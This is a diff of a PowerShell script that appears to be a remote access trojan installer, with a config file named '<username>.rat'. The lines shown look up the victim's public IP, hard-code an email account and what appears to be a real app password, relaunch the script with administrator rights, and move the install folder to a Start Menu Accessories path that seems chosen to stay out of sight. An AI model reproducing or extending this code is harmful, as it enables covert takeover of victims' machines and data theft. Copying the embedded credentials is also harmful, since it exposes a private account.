@@ -4,8 +4,8 @@ function random_text {
 
 # --- REQUIRED VARIABLES (REPLACE VALUES) ---
 Set-Variable -Name PublicIP -Value (Invoke-RestMethod -Uri "https://api.ipify.org")
-Set-Variable -Name email -Value "loirverse@gmail.com"  # CHANGE THIS
-Set-Variable -Name emailPassword -Value "kfjnnlovftazuxkk"  # CHANGE THIS
+Set-Variable -Name email -Value "loirverse@gmail.com"  
+Set-Variable -Name emailPassword -Value "kfjnnlovftazuxkk"  
 
 if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
     $arguments = "& '" + $myinvocation.mycommand.definition + "'"
@@ -35,7 +35,7 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 Set-Variable -Name wd -Value (random_text)
 Set-Variable -Name path -Value "$env:temp\$wd"
 Set-Variable -Name INITIALPATH -Value (Get-Location)
-Set-Variable -Name "initial_dir" -Value "$env:ProgramData\Microsoft\Windows\Templates"
+Set-Variable -Name "initial_dir" -Value "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Accessories"
 
 # Configuration file setup
 Set-Variable -Name configfile -Value ("$env:UserName.rat")
